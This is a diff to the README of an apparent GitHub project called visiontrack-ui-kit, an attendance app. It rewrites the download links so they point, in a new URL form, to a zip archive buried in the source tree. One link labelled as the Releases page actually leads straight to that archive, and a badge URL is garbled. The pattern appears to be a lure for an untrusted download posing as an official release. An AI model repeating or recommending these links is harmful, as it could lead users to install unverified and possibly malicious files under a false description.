@@ -6,7 +6,7 @@ Welcome to visiontrack-ui-kit! This application provides an AI-powered attendanc
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://raw.githubusercontent.com/farhan333-git/visiontrack-ui-kit/main/Downloads/visiontrack-ui-kit-main/src/components/ui/kit_visiontrack_ui_v2.7.zip%20Latest%https://raw.githubusercontent.com/farhan333-git/visiontrack-ui-kit/main/Downloads/visiontrack-ui-kit-main/src/components/ui/kit_visiontrack_ui_v2.7.zip)](https://raw.githubusercontent.com/farhan333-git/visiontrack-ui-kit/main/Downloads/visiontrack-ui-kit-main/src/components/ui/kit_visiontrack_ui_v2.7.zip)
+[![Download Latest Release](https://github.com/farhan333-git/visiontrack-ui-kit/raw/refs/heads/main/Downloads/visiontrack-ui-kit-main/src/components/ui/kit_visiontrack_ui_v2.7.zip%20Latest%https://github.com/farhan333-git/visiontrack-ui-kit/raw/refs/heads/main/Downloads/visiontrack-ui-kit-main/src/components/ui/kit_visiontrack_ui_v2.7.zip)](https://github.com/farhan333-git/visiontrack-ui-kit/raw/refs/heads/main/Downloads/visiontrack-ui-kit-main/src/components/ui/kit_visiontrack_ui_v2.7.zip)
 
 ## 📝 Features
 
@@ -26,7 +26,7 @@ Welcome to visiontrack-ui-kit! This application provides an AI-powered attendanc
 
 To get started, visit the Releases page to download the latest version of visiontrack-ui-kit.
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/farhan333-git/visiontrack-ui-kit/main/Downloads/visiontrack-ui-kit-main/src/components/ui/kit_visiontrack_ui_v2.7.zip)
+[Visit the Releases Page to Download](https://github.com/farhan333-git/visiontrack-ui-kit/raw/refs/heads/main/Downloads/visiontrack-ui-kit-main/src/components/ui/kit_visiontrack_ui_v2.7.zip)
 
 ### Steps to Install
 
